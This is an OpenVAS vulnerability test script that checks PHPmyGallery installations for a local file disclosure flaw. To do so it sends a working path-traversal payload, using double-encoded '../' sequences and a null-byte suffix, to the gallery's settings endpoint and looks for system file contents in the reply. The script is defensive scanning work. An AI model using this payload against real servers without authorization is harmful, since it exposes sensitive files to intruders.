###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmygallery_58081.nasl 2939 2016-03-24 08:47:34Z benallard $
#
# PHPmyGallery Local File Disclosure and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "PHPmyGallery is prone to multiple cross-site scripting vulnerabilities
and a local file-disclosure vulnerability because it fails to sanitize
user-supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and obtain
sensitive information from local files on computers running the
vulnerable application. This may aid in further attacks

PHPmyGallery 1.51.010 and prior versions are vulnerable.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103668";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(58081);
 script_version ("$Revision: 2939 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_name("PHPmyGallery Local File Disclosure and Cross Site Scripting Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/58081");
 script_xref(name : "URL" , value : "http://phpmygallery.kapierich.net/en/");

 script_tag(name:"last_modification", value:"$Date: 2016-03-24 09:47:34 +0100 (Thu, 24 Mar 2016) $");
 script_tag(name:"creation_date", value:"2013-02-26 12:29:14 +0100 (Tue, 26 Feb 2013)");
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/phpmygallery","/gallery",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {

    url = dir + '/_conf/?action=delsettings&group=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F' + files[file]  + '%2500.jpg&picdir=Sample_Gallery&what=descriptions'; 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}  

exit(0);
